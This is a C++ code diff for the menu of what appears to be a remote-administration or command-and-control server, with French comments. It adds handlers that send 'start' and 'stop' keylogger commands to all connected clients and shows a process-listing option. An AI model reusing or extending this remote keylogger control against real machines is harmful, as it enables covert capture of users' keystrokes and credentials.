@@ -81,12 +81,30 @@ void Menu::handleChoice(int choice) {
             std::cout << "=======================================" << std::endl;
             break;
         }
-        case 4:
+        case 4: {
             std::cout << "Option 4 sélectionnée: Démarrer le keylogger" << std::endl;
+            // Send start command for keylogger
+            std::string cmdStart = "start";
+            std::vector<uint8_t> startPayload(cmdStart.begin(), cmdStart.end());
+            LPTF_Packet request(1, PacketType::KEYLOG, 0, 1, 1, startPayload);
+            for (const auto& client : clients) {
+                client->sendBinary(request.serialize());
+            }
+            std::cout << "Keylogger démarré sur le client." << std::endl;
             break;
-        case 5:
+        }
+        case 5: {
             std::cout << "Option 5 sélectionnée: Eteindre le keylogger" << std::endl;
+            // Send stop command for keylogger
+            std::string cmdStop = "stop";
+            std::vector<uint8_t> stopPayload(cmdStop.begin(), cmdStop.end());
+            LPTF_Packet stopRequest(1, PacketType::KEYLOG, 0, 1, 1, stopPayload);
+            for (const auto& client : clients) {
+                client->sendBinary(stopRequest.serialize());
+            }
+            std::cout << "Keylogger arrêté sur le client." << std::endl;
             break;
+        }
         case 6: {
             std::cout << "Processus sur le client:" << std::endl;
             if (!lister.listProcesses()) {
